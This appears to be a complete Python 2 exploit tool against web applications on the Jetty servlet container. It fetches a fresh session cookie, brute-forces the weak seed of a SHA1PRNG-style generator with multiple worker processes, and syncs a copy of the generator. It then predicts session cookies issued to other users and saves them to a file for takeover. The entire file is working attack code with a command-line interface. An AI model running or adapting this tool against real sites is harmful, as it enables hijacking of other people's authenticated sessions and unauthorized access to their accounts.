from GnuSHA1PRNGMimic import GnuSHA1PRNGMimic
from multiprocessing import Process, Queue, Array, Value
import Queue as QT
import string, time, httplib, signal, sys
from optparse import OptionParser

class GNUSecRandBrutter:
    def __init__(self,url,WORKERS = 10,MAX_OFFSET = 100,SYNC_MAX_WIND = 100,SLEEP_INTERVAL = 10):
        self.url = url
        self.workers = WORKERS
        self.max_offset = MAX_OFFSET
        self.sync_max_wind = SYNC_MAX_WIND
        self.sleep_interval= SLEEP_INTERVAL
        
        self.queue = Queue(0) # Empy queue
        
        self.found = Value('i',0)
        self.syncRnd = None # Syncronized random generator
        self.seed = Array('i', range(32)) # Seed we found
        self.offset = Value('i',0) # Offset we found

    ## Obtain fresh cookie from WebApp
    def givemecookie(self):
        response = None

        host = self.url.replace("http://","").replace("https://","").split("/")[0]

        conn = httplib.HTTPConnection(host)
        conn.request("GET", self.url.replace("http://"+self.url,"").replace("https://"+self.url,""))
        response = conn.getresponse()

        return response.getheader('Set-Cookie').split(';')[0]

    ## Create and lauch worker processes.
    ## Fill queque.
    def brute(self):
        if self.found.value == 1:
		return self.syncRnd

        freshcookie = self.givemecookie().split("=")[-1].strip()
	
	print "freshcookie =",freshcookie
        
        workers = []

        for b0 in range(256): # Fill the queue
		for b1 in range(256):
			self.queue.put((b0,b1))
		#time.sleep(0.01)
	#self.queue.put((13,13))

        for i in range(self.workers):
		p = Process(target=self.brute_worker,args=(freshcookie,))
		workers.append(p)
		p.start()

        
	for w in workers: # Wait for workers
		w.join()
		

        self.syncRnd = GnuSHA1PRNGMimic(self.seed[:])
        self.syncRnd.setSeedL(self.syncRnd.nextLong())
        for i in range(2*self.offset.value):
		self.syncRnd.nextLong()

        return (self.found.value == 1)

    ## Converts int/long to string that represents number in radix 'base'
    def int2base(self,x, base):
        digs = string.digits + string.lowercase
        
        digits = []
        while x:
		digits.append(digs[x % base])
		x /= base
        digits.reverse()
        return ''.join(digits)

    ## Routine for worker process.
    def brute_worker(self,cookie):
        while True:
		if self.found.value == 1:
			return # Finish worker process
                
		job = None
		try:
			job = self.queue.get(timeout=1)
		except QT.Empty:
			print "[*] Queue is empty."
			return # Finish worker process

		seed = [job[0]]
		seed[1:32] = [job[1]]*31
		rnd = GnuSHA1PRNGMimic(seed)
		rnd.setSeedL(rnd.nextLong())

		offset = 0
		while (offset < self.max_offset):
			r0 = self.int2base(abs(rnd.nextLong()),36)
			r1 = self.int2base(abs(rnd.nextLong()),36)

			if cookie == r0+r1:
				self.found.value = 1
				self.offset.value = offset+1
				self.seed[:] = seed[:]
				return # Finish worker process
                        
			offset += 1

    def catch_cookies(self,fname):
        f = open(fname,"w")
        while True:
		if not self.brute():
			print "[*] Sorry, buddy, I am not able to brute generator. Try to increase MAX_OFFSET parameter"
			return
            
		freshcookie = self.givemecookie()
		print "[.] Got new cookie:",freshcookie
            
		cookiename = freshcookie.split("=")[0].strip()
		cookievalue = freshcookie.split("=")[-1].strip() 
            
		i = 1
		cage = [] # for cookies
		while (i < self.sync_max_wind):             
			x0 = abs(self.syncRnd.nextLong())
			x1 = abs(self.syncRnd.nextLong())
			
			r0 = self.int2base(x0,36)
			r1 = self.int2base(x1,36)

			if cookievalue == r0+r1:
				break

			cage.append(cookiename+"="+r0+r1)

			i += 1
		else:
			print "[*] Sorry, buddy, I am not able to sync generator. Try to increase SYNC_MAX_WIND parameter."
			return

		if i > 1:
			print "[!] Bingo, '%s' cookies in cage."%(i-1)
			for c in cage:
				f.write(c+"\n")
			f.flush()
                
		time.sleep(self.sleep_interval)

        f.close()

def exit_gracefully(signum, frame):
    sys.exit(1)

def main():
	parser = OptionParser(usage="usage: %prog -u <URL> -f <FILENAME> [-w <# of processes>]")
	parser.add_option("-u", action="store", type="string", dest="url",help="URL of application running on Jetty servlet container.")
	parser.add_option("-f", action="store", type="string", dest="filename",help="File where cookies are stored.")
	parser.add_option("-w", action="store", type="int", dest="workers",help="Number of processes.")

	(options, args) = parser.parse_args()

	if (options.url == None) or (options.filename == None):
		parser.print_usage()
		return

        workers = 10
	if options.workers != None:
            workers = int(options.workers)
	    
	signal.signal(signal.SIGINT, exit_gracefully)

	brute = GNUSecRandBrutter(options.url,WORKERS = workers)
	brute.catch_cookies(options.filename)
            
if __name__ == "__main__":
	main()
